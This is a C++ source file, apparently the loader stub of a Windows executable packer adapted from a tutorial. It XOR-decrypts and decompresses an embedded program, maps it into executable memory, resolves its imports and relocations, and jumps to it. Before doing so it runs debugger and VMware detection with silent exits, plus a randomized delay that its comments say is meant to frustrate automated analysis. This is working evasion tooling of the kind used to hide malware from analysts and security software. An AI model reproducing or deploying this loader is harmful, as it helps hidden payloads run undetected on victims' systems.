// Stub template based on packer-tutorial/stub/src/main.cpp
// This will be compiled into the SelfPacker as embedded code

#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>
#include <cstring>
#include <cstdint>
#include "zlib.h"

// Define PPEB if not available
#ifndef PPEB
typedef struct _PEB* PPEB;
#endif

// Disable optimizations to prevent code reordering
#pragma optimize("", off)

// Anti-analysis functions
__forceinline bool CheckDebuggerPresent() {
    return IsDebuggerPresent() || 
           (reinterpret_cast<PPEB>(NtCurrentTeb()->ProcessEnvironmentBlock)->BeingDebugged);
}

__forceinline bool CheckRemoteDebugger() {
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
    return debuggerPresent;
}

__forceinline bool CheckVMEnvironment() {
    // Basic VM detection
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

// PE manipulation functions (from packer-tutorial)
IMAGE_NT_HEADERS64* get_nt_headers(std::uint8_t* image) {
    auto dos_header = reinterpret_cast<IMAGE_DOS_HEADER*>(image);
    return reinterpret_cast<IMAGE_NT_HEADERS64*>(image + dos_header->e_lfanew);
}

const IMAGE_NT_HEADERS64* get_nt_headers(const std::uint8_t* image) {
    auto dos_header = reinterpret_cast<const IMAGE_DOS_HEADER*>(image);
    return reinterpret_cast<const IMAGE_NT_HEADERS64*>(image + dos_header->e_lfanew);
}

// Find and extract packed image data
std::vector<std::uint8_t> get_image() {
    // Find our packed section
    auto base = reinterpret_cast<const std::uint8_t*>(GetModuleHandleA(NULL));
    auto nt_header = get_nt_headers(base);
    auto section_table = reinterpret_cast<const IMAGE_SECTION_HEADER*>(
        reinterpret_cast<const std::uint8_t*>(&nt_header->OptionalHeader) + nt_header->FileHeader.SizeOfOptionalHeader);
    
    const IMAGE_SECTION_HEADER* packed_section = nullptr;

    // Look for our packed section (could have different names for polymorphism)
    for (std::uint16_t i = 0; i < nt_header->FileHeader.NumberOfSections; ++i) {
        const char* section_name = reinterpret_cast<const char*>(section_table[i].Name);
        if (strstr(section_name, "pack") || strstr(section_name, "data") || strstr(section_name, "code")) {
            // Additional check: our section should be the last one and contain our data structure
            if (i == nt_header->FileHeader.NumberOfSections - 1) {
                packed_section = &section_table[i];
                break;
            }
        }
    }

    if (packed_section == nullptr) {
        ExitProcess(1); // Silent exit on failure
    }

    // Extract packed data structure
    auto section_start = base + packed_section->VirtualAddress;
    
    // Read unpacked size
    auto unpacked_size = *reinterpret_cast<const std::size_t*>(section_start);
    section_start += sizeof(std::size_t);
    
    // Read encryption key size and key
    auto key_size = *reinterpret_cast<const std::size_t*>(section_start);
    section_start += sizeof(std::size_t);
    
    std::string encryption_key(reinterpret_cast<const char*>(section_start), key_size);
    section_start += key_size;
    
    // Read packed data
    auto packed_size = packed_section->Misc.VirtualSize - sizeof(std::size_t) * 2 - key_size;
    
    // Decrypt data
    std::vector<std::uint8_t> encrypted_data(section_start, section_start + packed_size);
    for (size_t i = 0; i < encrypted_data.size(); ++i) {
        encrypted_data[i] ^= static_cast<std::uint8_t>(encryption_key[i % encryption_key.length()]);
    }
    
    // Decompress data
    auto decompressed = std::vector<std::uint8_t>(unpacked_size);
    uLong decompressed_size = static_cast<uLong>(unpacked_size);

    if (uncompress(decompressed.data(), &decompressed_size, encrypted_data.data(), static_cast<uLong>(packed_size)) != Z_OK) {
        ExitProcess(2); // Silent exit on decompression failure
    }
                  
    return decompressed;
}

// Load PE image into memory
std::uint8_t* load_image(const std::vector<std::uint8_t>& image) {
    auto nt_header = get_nt_headers(image.data());
    auto section_table = reinterpret_cast<const IMAGE_SECTION_HEADER*>(
        reinterpret_cast<const std::uint8_t*>(&nt_header->OptionalHeader) + nt_header->FileHeader.SizeOfOptionalHeader);

    auto image_size = nt_header->OptionalHeader.SizeOfImage;
    auto base = reinterpret_cast<std::uint8_t*>(VirtualAlloc(nullptr,
                                                           image_size,
                                                           MEM_COMMIT | MEM_RESERVE,
                                                           PAGE_EXECUTE_READWRITE));

    if (base == nullptr) {
        ExitProcess(3);
    }

    // Copy headers
    std::memcpy(base, image.data(), nt_header->OptionalHeader.SizeOfHeaders);

    // Copy sections
    for (std::uint16_t i = 0; i < nt_header->FileHeader.NumberOfSections; ++i) {
        if (section_table[i].SizeOfRawData > 0) {
            std::memcpy(base + section_table[i].VirtualAddress,
                       image.data() + section_table[i].PointerToRawData,
                       section_table[i].SizeOfRawData);
        }
    }

    return base;
}

// Resolve imports
void load_imports(std::uint8_t* image) {
    auto nt_header = get_nt_headers(image);
    auto directory_entry = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (directory_entry.VirtualAddress == 0) { 
        return; 
    }

    auto import_table = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(image + directory_entry.VirtualAddress);

    while (import_table->OriginalFirstThunk != 0) {
        auto dll_name = reinterpret_cast<char*>(image + import_table->Name);
        auto dll_import = LoadLibraryA(dll_name);

        if (dll_import == nullptr) {
            ExitProcess(4);
        }

        auto lookup_table = reinterpret_cast<IMAGE_THUNK_DATA64*>(image + import_table->OriginalFirstThunk);
        auto address_table = reinterpret_cast<IMAGE_THUNK_DATA64*>(image + import_table->FirstThunk);

        while (lookup_table->u1.AddressOfData != 0) {
            FARPROC function = nullptr;
            auto lookup_address = lookup_table->u1.AddressOfData;

            if ((lookup_address & IMAGE_ORDINAL_FLAG64) != 0) {
                function = GetProcAddress(dll_import,
                                        reinterpret_cast<LPSTR>(lookup_address & 0xFFFFFFFF));
            } else {
                auto import_name = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(image + lookup_address);
                function = GetProcAddress(dll_import, import_name->Name);
            }

            if (function == nullptr) {
                ExitProcess(5);
            }

            address_table->u1.Function = reinterpret_cast<std::uint64_t>(function);
            ++lookup_table;
            ++address_table;
        }

        ++import_table;
    }
}

// Fix relocations
void relocate(std::uint8_t* image) {
    auto nt_header = get_nt_headers(image);

    if ((nt_header->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) == 0) {
        ExitProcess(7);
    }

    auto directory_entry = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (directory_entry.VirtualAddress == 0) {
        ExitProcess(8);
    }

    std::uintptr_t delta = reinterpret_cast<std::uintptr_t>(image) - nt_header->OptionalHeader.ImageBase;
    auto relocation_table = reinterpret_cast<IMAGE_BASE_RELOCATION*>(image + directory_entry.VirtualAddress);

    while (relocation_table->VirtualAddress != 0) {
        std::size_t relocations = (relocation_table->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(std::uint16_t);
        auto relocation_data = reinterpret_cast<std::uint16_t*>(&relocation_table[1]);

        for (std::size_t i = 0; i < relocations; ++i) {
            auto relocation = relocation_data[i];
            std::uint16_t type = relocation >> 12;
            std::uint16_t offset = relocation & 0xFFF;
            auto ptr = reinterpret_cast<std::uintptr_t*>(image + relocation_table->VirtualAddress + offset);

            if (type == IMAGE_REL_BASED_DIR64) {
                *ptr += delta;
            }
        }

        relocation_table = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
            reinterpret_cast<std::uint8_t*>(relocation_table) + relocation_table->SizeOfBlock);
    }
}

// Main stub entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Anti-analysis checks
    if (CheckDebuggerPresent() || CheckRemoteDebugger() || CheckVMEnvironment()) {
        ExitProcess(0); // Silent exit
    }

    // Add some timing delays to frustrate automated analysis
    Sleep(1000 + (GetTickCount() % 2000));

    try {
        // Unpack and execute original
        auto image = get_image();
        auto loaded_image = load_image(image);
        load_imports(loaded_image);
        relocate(loaded_image);

        auto nt_headers = get_nt_headers(loaded_image);
        auto entrypoint = loaded_image + nt_headers->OptionalHeader.AddressOfEntryPoint;
        
        // Transfer execution to original entry point
        reinterpret_cast<void(*)()>(entrypoint)();
    }
    catch (...) {
        ExitProcess(0); // Silent exit on any error
    }

    return 0;
}

#pragma optimize("", on)